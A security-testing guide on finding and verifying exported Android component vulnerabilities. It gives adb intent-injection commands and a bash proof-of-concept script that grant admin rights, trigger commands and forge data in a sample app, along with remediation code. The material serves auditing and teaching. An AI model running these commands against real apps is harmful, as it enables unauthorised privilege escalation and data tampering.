# Exported Component Vulnerabilities Hunt

> **Dual-Mode Hunt Pattern**: This guide supports both independent vulnerability hunting and SAST report verification.
> - **Part 1**: Independent Hunt - Find exported component vulnerabilities from scratch
> - **Part 2**: Report Verification - Validate SAST tool alerts for this vulnerability type
> - **Part 3**: Common Resources - Shared knowledge for both modes

---

# Part 1: Independent Hunt Mode

## Vulnerability Overview

**Type**: Misconfigured exported Android components accessible to unauthorized apps

**Target Components**:
- Exported Activities (android:exported="true")
- Exported Services
- Exported BroadcastReceivers
- Exported ContentProviders

**Severity Range**: CVSS 5.0 - 8.5 (Medium to High)
**Success Rate**: ~80% (very common in apps with inter-component communication)

## What to Look For

### Pattern 1: Exported Activities Without Permission

```xml
<!-- VULNERABLE -->
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true"/>  <!-- No permission required! -->
```

### Pattern 2: Exported Services Accepting Commands

```java
// VULNERABLE
public class CommandService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String command = intent.getStringExtra("cmd");
        // Executes any command from any app!
        executeCommand(command);
        return START_STICKY;
    }
}
```

### Pattern 3: Exported BroadcastReceivers

```xml
<!-- VULNERABLE -->
<receiver
    android:name=".receivers.AdminReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.ADMIN_ACTION"/>
    </intent-filter>
</receiver>
```

### Pattern 4: Implicit Intent Handlers

```java
// VULNERABLE - Accepts implicit intents
Intent intent = new Intent("com.app.ACTION_PROCESS");
intent.putExtra("data", sensitiveData);
sendBroadcast(intent);  // Any app can receive this!
```

## Search Commands

```bash
# Step 1: Extract and decompile APK
jadx -d output/ target.apk

# Step 2: Find all exported components in manifest
grep -n "android:exported=\"true\"" output/resources/AndroidManifest.xml

# Step 3: Find components without permission guards
grep -B5 "android:exported=\"true\"" output/resources/AndroidManifest.xml | \
  grep -v "android:permission"

# Step 4: Find intent-filter declarations (implicit intents)
grep -A10 "<intent-filter>" output/resources/AndroidManifest.xml

# Step 5: Find Activities handling Intent data
grep -r "getIntent()\\.get" output/sources/ | grep -E "Extra|Data"

# Step 6: Find Services handling Intent commands
grep -r "onStartCommand\\|onHandleIntent" output/sources/

# Step 7: Find BroadcastReceivers processing broadcasts
grep -r "onReceive.*Intent" output/sources/

# Step 8: Find implicit intent usage
grep -r "sendBroadcast\\|startActivity\\|startService" output/sources/ | \
  grep -v "setComponent\\|setClass"
```

## Validation Checklist

For each exported component found:

- [ ] Component is exported (android:exported="true")
- [ ] No permission guard (android:permission missing)
- [ ] Accepts sensitive data via Intent extras
- [ ] Performs privileged operations (admin, payment, data modification)
- [ ] No caller validation (getCallingUid(), checkCallingPermission())
- [ ] Can be triggered from unauthorized apps
- [ ] Has <intent-filter> (accessible via implicit intents)

## Exploitation Examples

### Exploit 1: Launch Exported Activity

```bash
# Access admin panel without authentication
adb shell am start -n com.app/.admin.AdminPanelActivity

# Pass malicious parameters
adb shell am start \
  -n com.app/.PaymentActivity \
  --es amount "-1000" \
  --es recipient "attacker@evil.com"
```

### Exploit 2: Service Command Injection

```bash
# Send arbitrary commands to service
adb shell am startservice \
  -n com.app/.CommandService \
  --es cmd "delete_all_users"

# Trigger privileged operations
adb shell am startservice \
  -n com.app/.BackupService \
  --es action "restore" \
  --es backup_path "/sdcard/malicious_backup.db"
```

### Exploit 3: Broadcast Injection

```bash
# Trigger admin actions
adb shell am broadcast \
  -a com.app.ADMIN_ACTION \
  --es action "grant_admin" \
  --es user "attacker"

# Inject fake data
adb shell am broadcast \
  -a com.app.DATA_UPDATE \
  --es data '{"balance": 999999}'
```

## Expected Success Indicators

**Vulnerable Manifest Pattern**:
```xml
<!-- Admin panel accessible to any app -->
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true"/>

<!-- Service executes commands without validation -->
<service
    android:name=".CommandService"
    android:exported="true"/>

<!-- Receiver grants permissions -->
<receiver
    android:name=".PermissionGrantReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.GRANT_PERMISSION"/>
    </intent-filter>
</receiver>
```

**Successful Exploitation**:
```bash
$ adb shell am start -n com.app/.admin.AdminPanelActivity
Starting: Intent { cmp=com.app/.admin.AdminPanelActivity }

$ adb shell am startservice \
    -n com.app/.CommandService \
    --es cmd "grant_root_access"
Starting service: Intent { cmp=com.app/.CommandService }

# Result: Gained admin access without authentication!
```

---

# Part 2: Report Verification Mode

> **Use this section when**: You have SAST tool output (MobSF, SonarQube, AI SAST, Qark) flagging exported component issues and need to verify if they're real vulnerabilities.

## Alert Identification

SAST tools report exported component issues in various formats:

### MobSF JSON Format
```json
{
  "code_analysis": {
    "findings": {
      "android_exported_component": [
        {
          "title": "Exported Activity Without Permission",
          "severity": "high",
          "description": "Activity AdminPanelActivity is exported without permission",
          "file": "AndroidManifest.xml",
          "line": 67
        }
      ]
    }
  }
}
```

### SonarQube XML Format
```xml
<issue>
  <key>squid:S6287</key>
  <rule>android:S6287</rule>
  <severity>MAJOR</severity>
  <component>AndroidManifest.xml</component>
  <line>67</line>
  <message>Activity is exported without permission protection</message>
</issue>
```

### AI SAST Markdown Format
```markdown
## Finding 4: Exported Activity Without Permission

**Severity**: High
**CVSS**: 8.5
**Category**: Exported Components
**Location**: AndroidManifest.xml:67

The `AdminPanelActivity` is exported without requiring any permission,
allowing any app on the device to launch it.
```

### Qark JSON Format
```json
{
  "vulnerability": {
    "name": "EXPORTED_COMPONENT",
    "severity": "HIGH",
    "component": "com.app.admin.AdminPanelActivity",
    "description": "Exported without permission guard"
  }
}
```

## Verification Workflow

### Step 1: Parse and Categorize Alert

**Extract key information:**
- Component name (Activity/Service/Receiver/Provider)
- Component full qualified name
- Exported status
- Permission attribute (if any)
- Intent filters
- File location (usually AndroidManifest.xml)
- Line number

**Categorize by component type:**
```bash
# Activities: Usually UI-related, less dangerous unless admin panels
# Services: Can execute background operations, higher risk
# Receivers: Can trigger actions on broadcast, medium risk
# Providers: Database access, high risk if SQL injection possible
```

### Step 2: Locate and Read Code Context

```bash
# Read manifest section for this component
sed -n '60,80p' output/resources/AndroidManifest.xml

# Example output:
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true">  <!-- Line 67 -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
    </intent-filter>
</activity>

# Find the Java/Kotlin implementation
find output/sources -name "AdminPanelActivity.java"

# Read the activity implementation
cat output/sources/com/app/admin/AdminPanelActivity.java
```

### Step 3: Pattern Validation (Filter False Positives)

**Common false positives:**

| Pattern | Why Flagged | Why Safe | Classification |
|---------|-------------|----------|----------------|
| `exported="true"` with `permission="signature"` | Exported attribute found | Only accessible by apps signed with same key | FALSE POSITIVE |
| Launcher activity exported | Has VIEW intent filter | Standard app entry point, no sensitive operations | FALSE POSITIVE |
| Component with runtime permission checks | Exported without manifest permission | Validates caller at runtime with checkCallingPermission() | FALSE POSITIVE |
| Component exported for internal IPC | No manifest permission | Only called by same-app components, uses explicit intents | FALSE POSITIVE (if verified) |
| Deep link handler with validation | Exported for browser links | Validates all parameters and requires user confirmation | FALSE POSITIVE (if validated) |

**Validation checklist:**

```java
// Check 1: Does it have permission guard?
<activity
    android:name=".AdminActivity"
    android:exported="true"
    android:permission="com.app.permission.ADMIN"/>  ✓ SAFE

// Check 2: Does code validate caller?
@Override
protected void onCreate(Bundle savedInstanceState) {
    // Runtime permission check
    if (checkCallingPermission("com.app.permission.ADMIN")
        != PackageManager.PERMISSION_GRANTED) {
        finish();
        return;  ✓ SAFE
    }
}

// Check 3: Is it launcher activity?
<intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>  ✓ SAFE (standard entry point)

// Check 4: Does it perform sensitive operations?
@Override
protected void onCreate(Bundle savedInstanceState) {
    // Only displays help text, no sensitive operations
    textView.setText(R.string.help_text);  ✓ LOW RISK
}
```

### Step 4: Data Flow Tracing

**Trace attack chain:**

```
┌─────────────────────┐
│ External App        │
│ (Attacker)          │
└──────────┬──────────┘
           │
           │ Intent with malicious extras
           ▼
┌─────────────────────┐
│ Exported Component  │ ← SOURCE (Intent extras)
│ (No permission)     │
└──────────┬──────────┘
           │
           │ Extract Intent data
           ▼
┌─────────────────────┐
│ Processing Logic    │ ← PROPAGATION (Validation?)
│ (Validate?)         │
└──────────┬──────────┘
           │
           │ If no validation...
           ▼
┌─────────────────────┐
│ Sensitive Operation │ ← SINK (Admin action, payment, etc.)
│ (EXPLOITABLE!)      │
└─────────────────────┘
```

**Real example:**

```java
// FILE: AdminPanelActivity.java

@Override
protected void onCreate(Bundle savedInstanceState) {
    // SOURCE: Intent from external app
    Intent intent = getIntent();
    String action = intent.getStringExtra("action");  // User controlled!
    String target = intent.getStringExtra("target");  // User controlled!

    // PROPAGATION: No validation!
    // (Red flag: No checks on action or target)

    // SINK: Performs admin operation
    if ("grant_admin".equals(action)) {
        // CRITICAL: Grants admin rights to any user!
        grantAdminPrivileges(target);  // ← EXPLOITABLE
    }
}

// Exploitability: HIGH
// An attacker can grant themselves admin privileges!
```

### Step 5: Exploitability Assessment

**Determine real-world impact:**

| Factor | Assessment | Impact |
|--------|------------|--------|
| **Access Control** | None (exported, no permission) | ✅ Exploitable |
| **Input Validation** | None in code | ✅ Exploitable |
| **Operation Sensitivity** | Grants admin privileges | ✅ High Impact |
| **User Interaction** | None required | ✅ Silent attack |
| **Attack Complexity** | Simple adb command | ✅ Easy to exploit |

**CVSS Calculation:**

```
Attack Vector (AV): Local (requires app install) = L
Attack Complexity (AC): Low (simple intent) = L
Privileges Required (PR): None = N
User Interaction (UI): None = N
Scope (S): Unchanged = U
Confidentiality (C): High (access admin data) = H
Integrity (I): High (modify permissions) = H
Availability (A): Low (usually doesn't crash) = L

CVSS v3.1: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
Base Score: 8.2 (HIGH)
```

**Classification:** ✅ **TRUE POSITIVE** - High severity exploitable vulnerability

### Step 6: PoC Generation

```bash
#!/bin/bash
# PoC for Exported AdminPanelActivity Vulnerability
# Target: com.app (version 2.3.1)
# Finding: Exported Activity allows unauthorized admin privilege escalation

set -e

echo "[+] Exported Component Exploitation PoC"
echo "[+] Target: com.app/.admin.AdminPanelActivity"
echo ""

# Test 1: Launch admin panel without authentication
echo "[*] Test 1: Accessing admin panel..."
adb shell am start -n com.app/.admin.AdminPanelActivity

sleep 2

# Test 2: Grant admin privileges to attacker account
echo "[*] Test 2: Granting admin privileges..."
adb shell am start \
  -n com.app/.admin.AdminPanelActivity \
  --es action "grant_admin" \
  --es target "attacker_user_id"

sleep 2

# Test 3: Verify admin access granted
echo "[*] Test 3: Verifying admin access..."
adb shell am start \
  -n com.app/.admin.AdminPanelActivity \
  --es action "check_admin" \
  --es user "attacker_user_id"

echo ""
echo "[+] Expected Result:"
echo "  - Admin panel opens without authentication"
echo "  - Admin privileges granted to attacker"
echo "  - Admin operations now accessible"
echo ""
echo "[+] Check logcat for confirmation:"
echo "  adb logcat | grep -i 'admin\\|privilege\\|grant'"
```

### Step 7: Dynamic Verification

**Execute PoC and capture results:**

```bash
# Step 1: Setup
adb install -r target.apk
adb logcat -c

# Step 2: Execute PoC
bash poc_exported_admin.sh

# Step 3: Monitor logcat
adb logcat | grep --color=always -iE "admin|privilege|grant|unauthorized"

# Expected output (TRUE POSITIVE):
# [AdminPanelActivity] Admin panel opened
# [AdminManager] Granting admin privileges to: attacker_user_id
# [UserManager] User attacker_user_id now has admin role
# [SecurityLog] ⚠️  Admin granted without authentication check!

# Step 4: Verify impact
adb shell am start \
  -n com.app/.admin.AdminDashboardActivity

# If successful: Admin dashboard opens = TRUE POSITIVE
# If blocked: Access denied = FALSE POSITIVE (has runtime checks)
```

### Common False Positive Patterns

| Alert Reason | Safe Pattern | How to Verify |
|--------------|--------------|---------------|
| "Exported without permission" | Has signature-level permission | Check permission protectionLevel |
| "Exported Activity" | Launcher activity (MAIN/LAUNCHER) | Check intent-filter |
| "No permission attribute" | Runtime checkCallingPermission() | Read onCreate/onStartCommand code |
| "Accepts Intent extras" | Validates all inputs | Trace data flow, look for validation |
| "Intent filter found" | Only accepts specific actions from own app | Check if implicit or explicit intents |

## Verification Report Template

```markdown
# Exported Component Verification Report

## Alert Details
- **SAST Tool**: MobSF
- **Alert ID**: android_exported_component_001
- **Component**: com.app.admin.AdminPanelActivity
- **File**: AndroidManifest.xml:67
- **Reported Severity**: High

## Verification Result: TRUE POSITIVE ✅

### Evidence

**1. Manifest Configuration**
```xml
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true"/>  <!-- No permission! -->
```

**2. Code Analysis**
- No runtime permission checks found
- Accepts "action" and "target" extras without validation
- Performs admin operations (grantAdminPrivileges)
- No caller identity verification

**3. Data Flow**
```
External App Intent → AdminPanelActivity.onCreate()
  → getStringExtra("action") [NO VALIDATION]
  → grantAdminPrivileges(target) [EXPLOITABLE]
```

**4. Dynamic Testing**
```bash
$ bash poc_exported_admin.sh
[+] Admin panel opened successfully
[+] Admin privileges granted to attacker
[+] Verification: Admin access confirmed
```

**5. Impact Assessment**
- **Severity**: HIGH (CVSS 8.2)
- **Exploitability**: Easy (simple adb command)
- **Impact**: Complete admin access without authentication
- **Risk**: Unauthorized privilege escalation

### Recommended Fix

**Priority**: P0 (Immediate)

**Option 1**: Add permission guard
```xml
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="false"/>  <!-- Prevent external access -->
```

**Option 2**: Add runtime validation
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    // Verify caller is authorized
    if (!isAdminUser(getCallingUid())) {
        finish();
        return;
    }
    // Process request
}
```
```

---

# Part 3: Common Resources

## CVSS Scoring Guidance

**Typical Range**: CVSS 5.0 - 8.5 (Medium to High)

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Local | Requires malicious app installation |
| AC | Low | Easy to trigger with adb or malicious app |
| PR | None | No privileges needed on device |
| UI | None | No user interaction required |
| S | Unchanged | Within app scope |
| C | High | May expose sensitive data or admin functions |
| I | High | Can modify app state or user data |
| A | Low | Usually doesn't crash app |

**Score increases if:**
- Admin/root functionality exposed (CVSS 8.0+)
- Financial transactions possible (CVSS 8.5+)
- User data can be modified (CVSS 7.5+)
- No authentication required (CVSS 7.0+)

## Remediation Guide

### Fix 1: Remove Unnecessary Exports

```xml
<!-- BEFORE -->
<activity
    android:name=".InternalActivity"
    android:exported="true"/>

<!-- AFTER -->
<activity
    android:name=".InternalActivity"
    android:exported="false"/>  <!-- Default in API 31+ -->
```

### Fix 2: Add Permission Guards

```xml
<!-- Define custom permission -->
<permission
    android:name="com.app.permission.ADMIN"
    android:protectionLevel="signature"/>  <!-- Only our apps -->

<!-- Require permission -->
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true"
    android:permission="com.app.permission.ADMIN"/>
```

### Fix 3: Validate Caller at Runtime

```java
// SECURE - Check calling app
public class SecureActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Get calling app package
        String callingPackage = getCallingPackage();

        // Verify it's from our app or trusted partner
        if (callingPackage == null ||
            !isAuthorizedPackage(callingPackage)) {
            Log.w(TAG, "Unauthorized access from: " + callingPackage);
            finish();
            return;
        }

        // Validate Intent data
        if (!validateIntentData(getIntent())) {
            finish();
            return;
        }

        // Process request
        handleIntent(getIntent());
    }

    private boolean isAuthorizedPackage(String pkg) {
        return pkg.equals(getPackageName()) ||
               TRUSTED_PACKAGES.contains(pkg);
    }
}
```

### Fix 4: Use Explicit Intents

```java
// BEFORE (VULNERABLE - implicit)
Intent intent = new Intent("com.app.ACTION");
sendBroadcast(intent);

// AFTER (SECURE - explicit)
Intent intent = new Intent(this, MyReceiver.class);
intent.setPackage(getPackageName());  // Restrict to our app
sendBroadcast(intent);
```

### Fix 5: Validate All Intent Data

```java
// SECURE
public class PaymentService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Validate caller
        if (!isCallerAuthorized()) {
            return START_NOT_STICKY;
        }

        // Validate intent data
        String recipient = intent.getStringExtra("recipient");
        if (!isValidRecipient(recipient)) {
            Log.w(TAG, "Invalid recipient: " + recipient);
            return START_NOT_STICKY;
        }

        double amount = intent.getDoubleExtra("amount", 0);
        if (amount <= 0 || amount > MAX_AMOUNT) {
            Log.w(TAG, "Invalid amount: " + amount);
            return START_NOT_STICKY;
        }

        // Process payment
        processPayment(recipient, amount);
        return START_STICKY;
    }
}
```

## Related CWE/OWASP

- **CWE-927**: Use of Implicit Intent for Sensitive Communication
- **CWE-926**: Improper Export of Android Application Components
- **OWASP Mobile M1**: Improper Platform Usage

## References

- [Android Component Security](https://developer.android.com/topic/security/risks/android-exported)
- [Intent Security](https://developer.android.com/privacy-and-security/risks/intent-redirection)
- [App Component Security Best Practices](https://developer.android.com/topic/security/best-practices)

---

**Hunt Version**: 2.0 (Dual-Mode)
**Last Updated**: 2026-02-27
**Success Rate**: ~80% (very common vulnerability)
**Modes**: Independent Hunt | SAST Verification
